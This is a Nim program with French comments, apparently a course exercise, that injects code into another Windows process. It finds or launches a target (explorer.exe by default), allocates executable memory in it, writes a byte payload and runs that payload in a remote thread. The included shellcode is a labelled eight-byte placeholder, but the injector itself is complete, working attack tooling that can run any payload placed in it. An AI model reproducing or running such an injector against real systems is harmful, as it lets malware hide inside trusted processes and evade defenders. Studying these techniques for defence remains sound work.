import winim
import strformat
import os  # Pour arguments ligne de commande

# ==============================================
# BONUS EXERCICE 2 : INJECTION DYNAMIQUE
# Processus configurable + création si absent
# ==============================================

const DEFAULT_TARGET = "explorer.exe"

# --- Shellcode factice ---
var shellcode: array[8, byte] = [
  byte 0xFC, 0x48, 0x83, 0xE4, 
  0xF0, 0xE8, 0xC0, 0x00
]

# --- Trouver processus par nom ---
proc findProcessByName(processName: string): DWORD =
  echo fmt"[*] Recherche de '{processName}'..."
  
  let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if hSnapshot == INVALID_HANDLE_VALUE:
    echo "[-] Erreur snapshot"
    return 0
  
  defer: CloseHandle(hSnapshot)
  
  var pe32: PROCESSENTRY32
  pe32.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  
  if Process32First(hSnapshot, addr pe32):
    while true:
      var exeName = $cast[cstring](addr pe32.szExeFile[0])
      
      if exeName.toLowerAscii() == processName.toLowerAscii():
        echo fmt"[+] Trouvé : PID = {pe32.th32ProcessID}"
        return pe32.th32ProcessID
      
      if not Process32Next(hSnapshot, addr pe32):
        break
  
  echo fmt"[-] Processus '{processName}' introuvable"
  return 0

# --- Créer un processus ---
proc createTargetProcess(processPath: string): DWORD =
  echo fmt"[*] Création du processus '{processPath}'..."
  
  var si: STARTUPINFO
  var pi: PROCESS_INFORMATION
  
  si.cb = cast[DWORD](sizeof(STARTUPINFO))
  
  let success = CreateProcess(
    nil,                          # Application
    processPath,                  # Ligne de commande
    nil,                          # Sécurité processus
    nil,                          # Sécurité thread
    FALSE,                        # Héritage handles
    0,                            # Flags création
    nil,                          # Environnement
    nil,                          # Répertoire courant
    addr si,                      # Startup info
    addr pi                       # Process info
  )
  
  if success == 0:
    echo "[-] Erreur CreateProcess"
    return 0
  
  # Fermer les handles (on n'en a pas besoin)
  CloseHandle(pi.hThread)
  CloseHandle(pi.hProcess)
  
  echo fmt"[+] Processus créé : PID = {pi.dwProcessId}"
  return pi.dwProcessId

# --- Injection distante (copié ex2) ---
proc injectRemote[I, T](shellcode: var array[I, T], pid: DWORD): bool =
  echo fmt"[*] Injection dans PID {pid}"
  
  # Ouvrir processus
  let hProcess = OpenProcess(
    PROCESS_CREATE_THREAD or PROCESS_VM_OPERATION or 
    PROCESS_VM_WRITE or PROCESS_VM_READ,
    FALSE,
    pid
  )
  
  if hProcess == 0:
    echo "[-] Erreur OpenProcess"
    return false
  
  defer: CloseHandle(hProcess)
  
  # Allouer mémoire
  let remoteMemory = VirtualAllocEx(
    hProcess,
    nil,
    cast[SIZE_T](shellcode.len),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  )
  
  if remoteMemory == nil:
    echo "[-] Erreur VirtualAllocEx"
    return false
  
  # Écrire shellcode
  var bytesWritten: SIZE_T
  let writeOk = WriteProcessMemory(
    hProcess,
    remoteMemory,
    shellcode[0].addr,
    cast[SIZE_T](shellcode.len),
    addr bytesWritten
  )
  
  if writeOk == 0:
    echo "[-] Erreur WriteProcessMemory"
    return false
  
  # Créer thread distant
  var threadId: DWORD
  let hThread = CreateRemoteThread(
    hProcess,
    nil,
    0,
    cast[LPTHREAD_START_ROUTINE](remoteMemory),
    nil,
    0,
    addr threadId
  )
  
  if hThread == 0:
    echo "[-] Erreur CreateRemoteThread"
    return false
  
  defer: CloseHandle(hThread)
  echo fmt"[+] Thread créé : TID = {threadId}"
  
  discard WaitForSingleObject(hThread, INFINITE)
  return true

# --- Point d'entrée ---
when isMainModule:
  echo "============================================"
  echo "  BONUS 2 - INJECTION DYNAMIQUE"
  echo "============================================"
  
  # Lire argument ligne de commande
  var targetName = DEFAULT_TARGET
  var createIfMissing = false
  
  if paramCount() > 0:
    targetName = paramStr(1)
    echo fmt"[*] Cible : {targetName}"
  else:
    echo fmt"[*] Cible par défaut : {targetName}"
  
  if paramCount() > 1 and paramStr(2) == "--create":
    createIfMissing = true
    echo "[*] Mode : création si absent"
  
  # Chercher le processus
  var pid = findProcessByName(targetName)
  
  # Si introuvable et création demandée
  if pid == 0 and createIfMissing:
    echo "[!] Processus absent, tentative de création..."
    
    # Construire le chemin (supposer que c'est dans System32)
    let processPath = r"C:\Windows\System32\" & targetName
    pid = createTargetProcess(processPath)
  
  # Injecter si PID trouvé
  if pid != 0:
    let success = injectRemote(shellcode, pid)
    if success:
      echo "[+] Injection réussie !"
      quit(0)
    else:
      echo "[-] Injection échouée"
      quit(1)
  else:
    echo "[-] Impossible de trouver/créer le processus"
    quit(1)